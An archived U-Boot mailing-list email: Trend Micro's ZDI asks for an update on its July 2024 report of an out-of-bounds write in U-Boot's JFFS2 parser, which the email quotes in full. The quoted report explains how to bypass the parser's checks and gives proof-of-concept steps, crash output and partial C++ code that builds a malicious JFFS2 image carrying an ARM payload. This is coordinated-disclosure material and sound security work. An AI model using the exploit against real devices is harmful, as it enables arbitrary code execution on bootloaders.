Return-Path: <u-boot-bounces@lists.denx.de>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 53A57D41C3A
	for <u-boot@archiver.kernel.org>; Thu, 14 Nov 2024 05:08:26 +0000 (UTC)
Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
	by phobos.denx.de (Postfix) with ESMTP id 7A75E895A3;
	Thu, 14 Nov 2024 06:08:24 +0100 (CET)
Authentication-Results: phobos.denx.de; dmarc=fail (p=quarantine dis=none) header.from=trendmicro.com
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
Authentication-Results: phobos.denx.de;
	dkim=fail reason="signature verification failed" (2048-bit key; secure) header.d=trendmicro.com header.i=@trendmicro.com header.b="O/kxKZvp";
	dkim-atps=neutral
Received: by phobos.denx.de (Postfix, from userid 109)
 id BA8B8895BD; Thu, 14 Nov 2024 05:03:16 +0100 (CET)
Received: from muc1mailout4.trendmicro.com (muc1mailout4.trendmicro.com
 [150.70.233.79])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits))
 (No client certificate requested)
 by phobos.denx.de (Postfix) with ESMTPS id E05EB88FFC
 for <u-boot@lists.denx.de>; Thu, 14 Nov 2024 05:03:13 +0100 (CET)
Authentication-Results: phobos.denx.de; dmarc=pass (p=quarantine dis=none)
 header.from=trendmicro.com
Authentication-Results: phobos.denx.de;
 spf=pass smtp.mailfrom=zdi-disclosures@trendmicro.com
Received: from muc1mailout4.trendmicro.com (unknown [127.0.0.1])
 by DDEI (Postfix) with ESMTP id 6BECD7F9CC9;
 Thu, 14 Nov 2024 04:03:13 +0000 (UTC)
Received: from muc1mailout4.trendmicro.com (unknown [127.0.0.1])
 by DDEI (Postfix) with ESMTP id 50D297F977E;
 Thu, 14 Nov 2024 04:03:13 +0000 (UTC)
X-TM-AS-ERS: 10.36.230.32-127.5.254.253
X-TM-AS-SMTP: 1.0 TVVDMS1FWENIMDEuZXUudHJlbmRuZXQub3Jn emRpLWRpc2Nsb3N1cmVzQ
 HRyZW5kbWljcm8uY29t
X-DDEI-TLS-USAGE: Used
Received: from MUC1-EXCH01.eu.trendnet.org (unknown [10.36.230.32])
 by muc1mailout4.trendmicro.com (Postfix) with ESMTPS;
 Thu, 14 Nov 2024 04:03:13 +0000 (UTC)
Received: from MUC1-EXCH02.eu.trendnet.org (10.36.230.33) by
 MUC1-EXCH01.eu.trendnet.org (10.36.230.32) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.1.2507.39; Wed, 13 Nov 2024 20:02:55 -0800
Received: from NAM12-DM6-obe.outbound.protection.outlook.com (104.47.59.168)
 by exhybrid.trendmicro.com (10.36.230.35) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.1.2507.37 via Frontend Transport; Thu, 14 Nov 2024 04:02:55 +0000
Received: from BYAPR01MB3830.prod.exchangelabs.com (2603:10b6:a02:83::21) by
 PH0PR01MB7426.prod.exchangelabs.com (2603:10b6:510:d9::6) with Microsoft SMTP
 Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.20.8158.18; Thu, 14 Nov 2024 04:02:46 +0000
Received: from BYAPR01MB3830.prod.exchangelabs.com
 ([fe80::3169:e6d9:86dd:7cf8]) by BYAPR01MB3830.prod.exchangelabs.com
 ([fe80::3169:e6d9:86dd:7cf8%6]) with mapi id 15.20.8158.013; Thu, 14 Nov 2024
 04:02:46 +0000
From: "zdi-disclosures@trendmicro.com" <zdi-disclosures@trendmicro.com>
To: "u-boot@lists.denx.de" <u-boot@lists.denx.de>, "trini@konsulko.com"
 <trini@konsulko.com>
Subject: RE: ZDI-CAN-24679: New Vulnerability Report 
Thread-Topic: ZDI-CAN-24679: New Vulnerability Report 
Thread-Index: AdrZTXhy+e33dzc1SjW672SeLXWatxc/EHBw
Date: Thu, 14 Nov 2024 04:02:29 +0000
Deferred-Delivery: Thu, 14 Nov 2024 04:01:58 +0000
Message-ID: <BYAPR01MB38307E0A0D8A480B35F122F6805B2@BYAPR01MB3830.prod.exchangelabs.com>
References: <DM5PR0102MB3477A6AC67623306D970177980AC2@DM5PR0102MB3477.prod.exchangelabs.com>
In-Reply-To: <DM5PR0102MB3477A6AC67623306D970177980AC2@DM5PR0102MB3477.prod.exchangelabs.com>
Accept-Language: en-US, es-ES
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
msip_labels: MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_ActionId=e6366093-88f8-4839-9eef-06d34e8e56cf;
 MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_ContentBits=0;
 MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Enabled=true;
 MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Method=Privileged;
 MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Name=Public
 Information - no protection;
 MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_SetDate=2024-07-18T20:03:23Z;
 MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_SiteId=3e04753a-ae5b-42d4-a86d-d6f05460f9e4;
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: BYAPR01MB3830:EE_|PH0PR01MB7426:EE_
x-ms-office365-filtering-correlation-id: 44b345ab-c697-4f1a-f1b2-08dd046132e1
x-ms-exchange-atpmessageproperties: SA
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0; ARA:13230040|366016|376014|1800799024|38070700018;
x-microsoft-antispam-message-info: =?us-ascii?Q?22GPHzhV5MxOgfiQ1QJkB0tg6mAemmLrXRoOHzAPZDSGAPiolJnEj904yta9?=
 =?us-ascii?Q?pCs/hn6WSwALAuoO84XaruBjMNO6LwwMadYi8umI4BZWtAwYIlw4rMITKS9O?=
 =?us-ascii?Q?giUjG+Z4bAjPGAbCBG0zKwIfyRO/ayBzZZD72Aif8JsddE2ZNgSwtjVV6WFf?=
 =?us-ascii?Q?JaTYXZjYhcvnPVgth5DfV5mS0/KyeLLj01Nn6mqnewOg9INuEML/MQhv1R7l?=
 =?us-ascii?Q?DLs+RYk1mrf3GgU70y1jfn3fKWeRYEjJyb2WkH9ggDM6/X99pd6jnvzanjEx?=
 =?us-ascii?Q?61JQ8GJ5kzcA+0/TbdfMPBDwGLBpVLD8RNWDWNCg9GoaWDtmNI4sJPGBIIxS?=
 =?us-ascii?Q?NhJklRM9VehvfW1rsZOUH9yqTBW1X6ntrjH71xeT759/sCGYvMeioFNan/+x?=
 =?us-ascii?Q?xTAGK0BqntXfIIlXuhzCFk6rl5mDKhYdMzd0m1MtbFPu6yz3lsmDtJJc3gba?=
 =?us-ascii?Q?MHlG6gc0CfFoSI2YxqIbMex+kYVvs8K0ZMKON9EOAmLeKonfGjlT069hma2p?=
 =?us-ascii?Q?RiOHqPZ/UNbRCU8unWAXZxERnF3x8rEl2+gq3UwTEB1yGzVEDAo/A4K8rRfg?=
 =?us-ascii?Q?TOv9JYulQBXUOLXTJwh6yk2x0e8zy7H3quMYrwTHYi1dtMnq0YKJ+rg34Mhn?=
 =?us-ascii?Q?2RinhVTJfju7PcU/MylvXtkDXnOrAIUKDiU53M4wTc7oG/drH3p3iLjsMWQV?=
 =?us-ascii?Q?rI8fnJpazBpu8NOVtpvTLMQFfYubV7mNYxg7KeHPgRlehju5L6z8gLsB0Jsh?=
 =?us-ascii?Q?rRCgzqLxXQJLAwslZB4lueasUCEfKuT9nMMkAyZMffoozpOTywkBWR4mdjgx?=
 =?us-ascii?Q?Aokof2L/8P4suP4B1uGVSMGHwKJrmGLeBec5Z3fY3rO28ypGkeSx15SUL8hx?=
 =?us-ascii?Q?IkWqtcJjY3oI1m0EpDQ4xZDSTAtl5YU43QkpJOOP7waA1yHvQiNcCc5tmDu9?=
 =?us-ascii?Q?vrQEv2+MZV5T8QHlLVO6Ie8JdMXrrhunU2aetfXZCuoLMAubEOk6kJAejNKh?=
 =?us-ascii?Q?nqCh0jwGfvAi3cvV2dZyL4Gf2kMaR9lcZ5DTu8f7SR0qsx64g54GN2X2KeGd?=
 =?us-ascii?Q?tG+ScITi/7SDsBfHRxR/hidrEuijmRhg00CzxdY0OVPIObkBgx/ySgcOCDic?=
 =?us-ascii?Q?ImUgnoD7HHaTLA4HNhB0cRJN8i5qZVTz8vc38qhhH/gPioHXMC+BD0kbcd3D?=
 =?us-ascii?Q?cax7BMr2U9ffwvvJcyYFJitSV1Nigmi70FFSTbTidpgV2AB10v3XEKeBbqd2?=
 =?us-ascii?Q?dig29WDFmFBx0lbHa1TaBOr4xn+csbfu1JZ3EZbXnzzJhooibblQK6MePiHp?=
 =?us-ascii?Q?OCBxbKTgilWljmF4I7QwzgSR?=
x-forefront-antispam-report: CIP:255.255.255.255; CTRY:; LANG:en; SCL:1; SRV:;
 IPV:NLI; SFV:NSPM; H:BYAPR01MB3830.prod.exchangelabs.com; PTR:; CAT:NONE;
 SFS:(13230040)(366016)(376014)(1800799024)(38070700018); DIR:OUT; SFP:1101; 
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: =?us-ascii?Q?1l7vcoq1lYHKwcz7YOH+Sp7mzmM4/vWtHzZQxzPTTcAazl28Ci3dPetIHBkh?=
 =?us-ascii?Q?WKMmyB4Wk4Tx2jqV+AW+qgR+NXbfDaNz8BQfC6uhQ2tvXxOwGr0iFPdhqk+u?=
 =?us-ascii?Q?mHWoxZbCQG4cfgdupeNTvZUVvy7yVmZfm7Tivl7Ufu6g7MrCdu+rcW+kyKVq?=
 =?us-ascii?Q?1zWbtcpBjt7gaBfgyeuKCIa1AMY+1erwW48mOYeNhw9uZpRt9MhuAIvxDown?=
 =?us-ascii?Q?4/afqNc+uDijw0p2NQfgHXLWXOgtZmg6pnyWjYIGkiDIZpfJBqB363EGJJF3?=
 =?us-ascii?Q?MBQQ8Wb0BDzqlNd5mbfvwiOE0PazJk/pr3EVP1vG2EX0xVxcG4cpSV8ZvnHw?=
 =?us-ascii?Q?z2mZZcxa+J6Fs31kWzhj97rHqwNJV2lyvGTzjwwDeRpvj4I8YyWvL29GC8zV?=
 =?us-ascii?Q?Cg55b4bbYvvZ8E95k5FWeNtfpvr54gVB9RckBwkDrYxFTWW0ttJ+S2FgVrBL?=
 =?us-ascii?Q?0Eut5+xulHnHJ02vt+13idlNXdr6EeMjlnYaYHD4I4LK/1FSCVU09KiAMISt?=
 =?us-ascii?Q?QSYaj54ucklZWSsllOL2PlhdopQubIdTnYEZesLO+cFK3mxgq2dPsuN+/ElQ?=
 =?us-ascii?Q?W3pSwNmENs0qsyuJJPGGp7Mfh+imsai9I89+Mo2Pmm7V5G1jkaVnoTEA8Ssm?=
 =?us-ascii?Q?YKOThJ7vRsAX3nmyR1pKiS+uvX11SyIuczsK9Qv3S4gEmdKqLMhBtzoOf9Ub?=
 =?us-ascii?Q?s1RRd+N1g9eMA6JPA6Gg5UkjXVWXIBim8x+sbPoGLeCR1J9i0vQjIDEaRbWF?=
 =?us-ascii?Q?0+4ZX/LOAvTMh5HpbM+bWHlUt3ues+PgFGV0HqlinhzjLPmSn8bL4TijV5ff?=
 =?us-ascii?Q?OwSAzJfEPE7uwYF6EBDXG4S4IryuQrQpVQ97hdK+2FBnC6P3/wEFOs+bocLj?=
 =?us-ascii?Q?p7QwzTRns6KfDj3hBLRY0g+L2E5/hn0XUAqHPewY43j9xmEPbGMUO0YfCfpN?=
 =?us-ascii?Q?xee/YX5jDupjSK8qI15KGBf8GkrwEic0OU4YHWac/Y9XWEfJsqkA5CIAZfxS?=
 =?us-ascii?Q?yVUXPLO1GHF/nD/3j38kR2ClQnYhm7q6F8zNWro3TxHTWlt6ljcHSMrWjixz?=
 =?us-ascii?Q?ZUIrqGO38QPXIW1QBwr3QFb+U6pSUfQBPSgH99AkKpZ3fGTgqliGdivdu1On?=
 =?us-ascii?Q?ZK6NDIuHY8JWkjj+XBnVLrCi75L6wjzFP3ftqNpyLH/P6oYfqLBXNUBS5gQR?=
 =?us-ascii?Q?veXxN7DLNx2iYLt47aLS/T+GzYqiwfrF7yUzi5qVfofKcfIwXHdZIhE9d1u2?=
 =?us-ascii?Q?nZN1x0wwFEDAD47f5bFWbVHnNJu/9QcJFUnYeboQswhWC51KRNFcJe54NGLq?=
 =?us-ascii?Q?rHp8JCMpdACkxUwmY8vR945WvE981dlmR3W4NWKS6zZdgB35J3bxB0PCDU/w?=
 =?us-ascii?Q?XDl0xbsDmKuj47CfQ+E6eMQvkeJCaQnr8aphWA5Ji7JpHrcnTciBcH92aBJO?=
 =?us-ascii?Q?Je6lvJq+DdSAMEoI+k1IuoseoP3cq8pU05qI5t/7ZN6sGPKSf18XOIxBf4sI?=
 =?us-ascii?Q?Q80Wz+oJEl4g+mBvhx6xmQxqf8W/15SDY7pH+vxl1KULfBn2HgOGwTM+mD2T?=
 =?us-ascii?Q?Oc6X9vsgnq1pxbFwww3kfj9WUQKw1XKzwIuFAJrE8ludIyViVotCADYHI+RA?=
 =?us-ascii?Q?xg=3D=3D?=
arc-seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=M4JIAwJ4yzjTeaityxnd8LOeCQ/FRL4Ul5UiSFythqLZDIi2g5O9BBe5SVX5lWvvBhD/cwpg+Pn3FYhy3h2JH9qpD1WKesQB0cfem5KzMm2W2AnGqIKJ2YKjLN/fRjOcuwFQcim6hAQOzcPaT2tJSBLzxXfpCIykkpLfEE3aZZqWwqwOQhoPSDg2+LidNPORoh7sDc9NexQ8+340LfRHTGqsf5W6At5Sbwqqyjl0CFE0vG5CTmDPGciVPp900mBRVjAWcMilLiiwa5p4hbU+LqzBPMTuACDuyvkoG+kAlv628ohcusvqMLVPH2NuluYlNiQ0EvFO0hFmq2pvX9vzPw==
arc-message-signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com; 
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=4azm5/fRxERopsBlNqrUpeemr8SeRQoxSNbMnE+c1hg=;
 b=IyHtnIrzBNRxBUT4wy3jQ/nE8aPuf7Y6s68EcP5hOy88RbaDiHVh/tlWrv246kejVd+gGSntG8O74hWAOYC8N335kUrparWY7JIa+aW0SO4i0PFNnAQExjlFThX5J8mkiMk3G6B5bgTU9PsltZ3Cp7CCJfg9sqtK3fa4QxWMtJ1La7R0Gbi0yMC/+hid2jkXQ4DqK3NjayqQnoFmkI9/M5H6TV2t04dBDyQOlSiWDTpUAId7RSaxjJo9O7WerpY7m4WoWxoS23H+4KySXSgB0wD6l5JzoNblv+nlKulFAvXYJGeEzNAhD/KmMveYJcjV67T3tavDHUGRJJIMeoqgIA==
arc-authentication-results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=trendmicro.com; dmarc=pass action=none
 header.from=trendmicro.com; dkim=pass header.d=trendmicro.com; arc=none
x-ms-exchange-crosstenant-authas: Internal
x-ms-exchange-crosstenant-authsource: BYAPR01MB3830.prod.exchangelabs.com
x-ms-exchange-crosstenant-network-message-id: 44b345ab-c697-4f1a-f1b2-08dd046132e1
x-ms-exchange-crosstenant-originalarrivaltime: 14 Nov 2024 04:02:46.8328 (UTC)
x-ms-exchange-crosstenant-fromentityheader: Hosted
x-ms-exchange-crosstenant-id: 3e04753a-ae5b-42d4-a86d-d6f05460f9e4
x-ms-exchange-crosstenant-mailboxtype: HOSTED
x-ms-exchange-crosstenant-userprincipalname: gA4sz7YD/8tWjEhDKNob/K3IqSmf14u4K1KEqXcq9E5ahy308kXnkxIx2JycMyEnaBNHj7FE1ZOwkZBH/8AmzYfB48GO//YxyEjcV+KsET4=
x-ms-exchange-transport-crosstenantheadersstamped: PH0PR01MB7426
x-originatororg: trendmicro.com
x-tm-as-product-ver: SMEX-14.0.0.3197-9.1.2019-28796.004
x-tm-as-result: No-10--44.433700-5.000000
x-tmase-matchedrid: nmcTHWfunFRyv0jrUI8Jl5f6z3i56SVPAkIsG9uqSe5S1vM/0iAx5RNj
 OrRs2JZOqbH5Ounxwo7f38kJyPLXFLaZbCduoWZAtzZ794SrPX1xGsg9/k1hHP001yod3AT29mF
 YXDyCbwmPr0bnxattRyi1/ydCSP9jHDsqXHk+oA06jVTQPLLDGlCxGRLUsJqn7dqGWuybY1Oxsk
 BtUtNZ5bR1+VuTKPIRyxsA/McMs6E3H7Du588u9LCiKP0A/Tj/FVx2DN1YE/cP3xcLNA5qVNThg
 PE1IHstIUGfR+XRKeOejEEKCcvn3N+cKK6j7jiLQY2FPulT1X0KonRFsndtvThseluHb7d4wgV5
 hiB4orTlNiA90QUbyRm8pXnanZYKAlXlYoSOpIInFbk2KPuAbMhQ2ZMNvRp35pYwChzKvwmH0MM
 I5nuArdabQyTTNN0kwJTEicUsHPvMwWL2h0BFHIHLP95ys8GMSx9mAhxKYj0WpRJTNXaa58LUQc
 0yH8j4gR/u81+jJxisq6JF0oMfh6QDqdoe/D8BhH6kN1B9m4Y+aTwpj+UULXqiXLIIfJ4N8GCh6
 40OlocDEdMH5zfy6uqIZPFDqFBFTFu8Dq4n42dyvaSiAX3Gaoi/ka5VrHsK5mGd1hWlI2Yvkg5d
 Sp+GVKASZljLcG7fxIyh90qJaadkc1ZyF4C6VyxCP7citTZPkh0LRDkkMBxvJQwByUH6ODW2MjQ
 T1wnoS+UVceN4iSCAVDKk/MclmO18p33/uLVOHBCHExSex5x380bmJIN/80yAkmul56OMTk08dU
 JEhEmclhLJPgjVIrtLKQ+7F42XYRyQxQ0iEwua4QotgY24vlvIId8M26gTM3uAQIKC4sUwTnhKN
 UREsS0GnZevFUWYIToBoaJK7eliyuQOZndK/bpcTKsMs1ZRIbZSWXZZ520=
x-tm-as-user-approved-sender: No
x-tm-as-user-blocked-sender: No
x-tmase-result: 10--44.433700-5.000000
x-tmase-version: SMEX-14.0.0.3197-9.1.2019-28796.004
x-tm-snts-smtp: 44D4479FE775A23CB35002FED2B95CEC19CE972B596A418F27314640D456C8972000:7
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-TM-AS-ERS: 10.36.230.32-127.5.254.253
X-TM-AS-SMTP: 1.0 TVVDMS1FWENIMDEuZXUudHJlbmRuZXQub3Jn emRpLWRpc2Nsb3N1cmVzQ
 HRyZW5kbWljcm8uY29t
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=trendmicro.com;
 s=tm-outbound; t=1731556993;
 bh=5nEBEk0MFtsqH2akRyyhqUF3VKEv1auc3IJ6KMb1qng=; l=13076;
 h=From:To:Date;
 b=O/kxKZvp/7y9tNP1NTbOLQwX872PVA6CLMxPMu+ZQOdRpgKfsjHQZ8HYilDLEbmjz
 VJ7ScnKyNyTCT2MyvJ98j06X/VvVPD0pouCG/SBeABXGYOAnI91SxXnuZ53xli22Us
 DJrDNtUVKHAvmxsHuJh84FNiv7/HclvDxexMpU3DhyQdFd5xljSqWEgPGR/bG2QIg6
 qyEJbimmjFLzv8+ghCQTmqON3/SzExH79CWFsOJLLrJtS9XXvceQOV8v//c4/I6S77
 Mgdg8tAigKetwhcnkPAHt6fGSKIGxGaZTyONsnT3XVC2FuuuN5VskFTuvl6qP7c1+4
 iWn021k69tIeg==
X-Mailman-Approved-At: Thu, 14 Nov 2024 06:08:22 +0100
X-BeenThere: u-boot@lists.denx.de
X-Mailman-Version: 2.1.39
Precedence: list
List-Id: U-Boot discussion <u-boot.lists.denx.de>
List-Unsubscribe: <https://lists.denx.de/options/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=unsubscribe>
List-Archive: <https://lists.denx.de/pipermail/u-boot/>
List-Post: <mailto:u-boot@lists.denx.de>
List-Help: <mailto:u-boot-request@lists.denx.de?subject=help>
List-Subscribe: <https://lists.denx.de/listinfo/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=subscribe>
Errors-To: u-boot-bounces@lists.denx.de
Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
X-Virus-Status: Clean

Hi,
Do you have any updates to share regarding this vulnerability report?

Thanks,
ZDI

-----Original Message-----
From: ZDI Disclosures Mailbox
Sent: Thursday, July 18, 2024 4:05 PM
To: 'u-boot@lists.denx.de' <u-boot@lists.denx.de>; 'trini@konsulko.com' <tr=
ini@konsulko.com>
Subject: ZDI-CAN-24679: New Vulnerability Report

ZDI-CAN-24679: Das U-Boot JFFS2 Image Handling Out-Of-Bounds Write Local Pr=
ivilege Escalation Vulnerability

-- CVSS -----------------------------------------

8.2: AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

-- ABSTRACT -------------------------------------

Trend Micro's Zero Day Initiative has identified a vulnerability affecting =
the following products:
Das U-Boot - Das U-Boot

-- VULNERABILITY DETAILS ------------------------
* Version tested: 2024.07-rc4
* Installer file: N/A
* Platform tested: QEMU

---

### Analysis

Das U-Boot versions from 2002_11_05_0120 to v2024.07-rc4 are vulnerable to =
an arbitrary code execution attack. This vulnerability exists due to an unc=
hecked memcpy function used when processing a JFFS2 filesystem image. An at=
tacker could exploit this by crafting a malicious JFFS2 image that tricks m=
emcpy into overwriting memory at an arbitrary offset with malicious code. T=
his could result in the attacker executing arbitrary code on the system or =
causing other memory corruption issues.

The parsing of JFFS2 filesystem in Das U-Boot is handled by the `jffs2_1pas=
s_read_inode()` function defined in `fs/jffs2/jffs2_1pass.c`. ( https://git=
hub.com/qemu/u-boot/blob/master/fs/jffs2/jffs2_1pass.c )

At line 777 of this file, there is a statement for memory copy:

```
ldr_memcpy(lDest, src, jNode->dsize);
```

The first two arguments for memcpy are assigned as:

At line 770: `lDest =3D (uchar *) (dest + jNode->offset);` At line 755 and =
756: `src =3D ((uchar *)jNode) + sizeof(struct jffs2_raw_inode);`

As shown above, the source, destination, and size of the memcpy are control=
led by an attacker and its following content, and Das U-boot does not prope=
rly check these arguments.

Although Das U-Boot does have some checks on the content of inodes, these c=
hecks can be easily bypassed:

At line 758, it checks if `JNode->offset > totalSize`, but totalSize is ass=
igned as totalSize =3D jNode->isize at line 714. Therefore, this check can =
be bypassed by setting `JNode->isize` to 0xFFFFFFFF.

At lines 763, it also checks the CRC, but this check can be bypassed by set=
ting both `JNode->csize` and `JNode->data_crc` to 0.

### Proof of Concept

To prove the concept, we created a small program that generates a specially=
 crafted JFFS2 filesystem image. We then used QEMU to demonstrate the poten=
tial risk of this vulnerability. The Das U-Boot, when reading the specially=
 crafted filesystem image, writes content given by us to a memory location =
specified by us, causing the system to crash. We have tested this in Ubuntu=
 14.04. Follow the following instructions to set up the environment and con=
duct the PoC test.

- Install QEMU for MINI2440:

```
sudo apt-get install git git-core
cd ~
mkdir mini2440_qemu/
cd mini2440_qemu
git clone git://repo.or.cz/qemu/mini2440.git qemu cd qemu ./configure --tar=
get-list=3Darm-softmmu --prefix=3D$HOME/workspace/mini2440_qemu/qemu/mini24=
40
make
make install
export PATH=3D$HOME/workspace/mini2440_qemu/qemu/mini2440/bin:$PATH
git clone https://github.com/WeitaoZhu/mini2440-buildroot.git
cd mini2440-buildroot
make mini2440_defconfig
make menuconfig
```

- Modify Filesystem images to NAND flash with 512B Page and 16 kB erasesize

```
make -j4
cd ~
git clone https://github.com/cailiwei/flashimg
cd flashimg
./autogen.sh
./configure
make
cp ~/workspace/mini2440_qemu/mini2440-buildroot/output/images/u-boot.bin ~/=
flashimg
g++ poc.cpp -o poc
./poc
echo -e "root\t0x4000\t0x00000000">part.txt
./flashimg -s 64M -t nand -f nand.bin -p part.txt -w root,test -z 512 qemu-=
system-arm -M mini2440 -serial stdio -mtdblock nand.bin -usbdevice mouse ``=
`

- In QEMU, type the following commands:

```
fsload
ls
go 0x32700000
```

- The output should look like the following

```
MINI2440 # fsload
### JFFS2 loading 'uImage' to 0x32000000 Scanning JFFS2 FS: . done.
load: Failed to read inode
### JFFS2 LOAD ERROR<0> for uImage!
MINI2440 # go 0x32700000
## Starting application at 0x32700000 ...
qemu: fatal: Trying to execute code outside RAM or ROM at 0x12345678

R00=3D00000001 R01=3D33d5fb70 R02=3D00000041 R03=3D00000006
R04=3D33d5fb70 R05=3D00000002 R06=3D32700000 R07=3D00000000 R08=3D33d5ffdc =
R09=3D00000001 R10=3D00000000 R11=3D33d5fbfd
R12=3D00000020 R13=3D33d5fb4c R14=3D33f8c4e8 R15=3D12345678
PSR=3D600001d3 -ZC- A svc32
Aborted (core dumped)
```

Note: R15 is $pc and it has been modified to 0x12345678

poc.cpp:

```c
#include <stdio.h>
#include <stdlib.h>
#include <cstdint>
#include <cstring>
#include <string.h>
#include <ctype.h>
#include <sys/stat.h>
using namespace std;
#define JFFS2_MAGIC_BITMASK  0x1985
#define JFFS2_NODE_ACCURATE  0x2000
#define JFFS2_FEATURE_INCOMPAT  0xC000
#define JFFS2_FEATURE_RWCOMPAT_DELETE  0x0000 #define JFFS2_NODETYPE_DIRENT=
  (JFFS2_FEATURE_INCOMPAT | JFFS2_NODE_ACCURATE | 1) #define JFFS2_NODETYPE=
_INODE  (JFFS2_FEATURE_INCOMPAT | JFFS2_NODE_ACCURATE | 2) #define JFFS2_NO=
DETYPE_CLEANMARKER  (JFFS2_FEATURE_RWCOMPAT_DELETE | JFFS2_NODE_ACCURATE | =
3) enum
  {
    DT_UNKNOWN =3D 0,
# define DT_UNKNOWN     DT_UNKNOWN
    DT_FIFO =3D 1,
# define DT_FIFO        DT_FIFO
    DT_CHR =3D 2,
# define DT_CHR         DT_CHR
    DT_DIR =3D 4,
# define DT_DIR         DT_DIR
    DT_BLK =3D 6,
# define DT_BLK         DT_BLK
    DT_REG =3D 8,
# define DT_REG         DT_REG
    DT_LNK =3D 10,
# define DT_LNK         DT_LNK
    DT_SOCK =3D 12,
# define DT_SOCK        DT_SOCK
    DT_WHT =3D 14
# define DT_WHT         DT_WHT
  };
uint32_t crc32(unsigned char* ptr,uint32_t Size) {

  uint32_t crcTable[256],crcTmp1;
  for (int i=3D0; i<256; i++)
   {
    crcTmp1 =3D i;
    for (int j=3D8; j>0; j--)
     {
      if (crcTmp1&1) crcTmp1 =3D (crcTmp1 >> 1) ^ 0xEDB88320L;
       else crcTmp1 >>=3D 1;
    }

     crcTable[i] =3D crcTmp1;
   }
  int32_t crcTmp2=3D 0;
  while(Size--)
  {
    crcTmp2 =3D ((crcTmp2>>8) & 0x00FFFFFF) ^ crcTable[ (crcTmp2^(*ptr)) & =
0xFF ];
    ptr++;
  }
  return (crcTmp2^0xFFFFFFFF)^0xFFFFFFFF; } struct Jffs2_unknown_node {
            int16_t magic;
            int16_t nodetype;
            int32_t totlen;
            int32_t hdr_crc;
};
struct Jffs2_raw_dirent
{
            int16_t magic;
            int16_t nodetype;
            int32_t totlen;
            int32_t hdr_crc;
            int32_t pino;
            int32_t version;
            int32_t ino;
            int32_t mctime;
            int8_t nsize;
            int8_t type;
            int8_t unused[2];
            int32_t node_crc;
            int32_t name_crc;
};
struct Jffs2_raw_inode
{
            int16_t magic;
            int16_t nodetype;
            int32_t totlen;
            int32_t hdr_crc;
            int32_t ino;
            int32_t version;
            int32_t mode;
            int16_t uid;
            int16_t gid;
            int32_t isize;
            int32_t atime;
            int32_t mtime;
            int32_t ctime;
            int32_t offset;
            int32_t csize;
            int32_t dsize;
            int8_t compr;
            int8_t usercompr;
            int16_t flags;
            int32_t data_crc;
            int32_t node_crc;
};
int main(void)
{
        //PAYLOAD CONFIG
        char TARGET_FILENAME []=3D "uImage";
        uint32_t TARGET_OFFSET =3D 0x700000;
        uint32_t TARGET_LENGTH =3D 0x8;
        unsigned char PAYLOAD[]=3D "\x04\xf0\x1f\xe5\x78\x56\x34\x12"; //ld=
r $pc,0x12345678
        //
        FILE *fp =3D fopen("poc.jffs2","wb");
        uint16_t padding =3D 0xFFFF;
        Jffs2_unknown_node node;
        node.magic =3D JFFS2_MAGIC_BITMASK;
        node.nodetype =3D JFFS2_NODETYPE_CLEANMARKER;
        node.totlen =3D sizeof(node);
        node.hdr_crc =3D crc32((unsigned char*)&node,sizeof(Jffs2_unknown_n=
ode)-4);
        fwrite(&node,1,sizeof(node),fp);
        Jffs2_raw_dirent dirent;
        dirent.magic =3D JFFS2_MAGIC_BITMASK;
        dirent.nodetype =3D JFFS2_NODETYPE_DIRENT;
        dirent.totlen =3D sizeof(dirent)+strlen(TARGET_FILENAME);
        dirent.hdr_crc =3D crc32((unsigned char*)&dirent,sizeof(Jffs2_unkno=
wn_node)-4);
        dirent.pino =3D 1;
        dirent.version =3D 0;
        dirent.ino =3D 2;
        dirent.mctime =3D 0;
        dirent.nsize =3D strlen(TARGET_FILENAME);
        dirent.type =3D DT_REG;
        dirent.unused[0] =3D 0;
        dirent.unused[1] =3D 0;
        dirent.mctime =3D 0;
        dirent.node_crc =3D crc32((unsigned char*)&dirent,sizeof(Jffs2_raw_=
dirent)-8);
        dirent.name_crc =3D crc32((unsigned char*)TARGET_FILENAME,strlen(TA=
RGET_FILENAME));
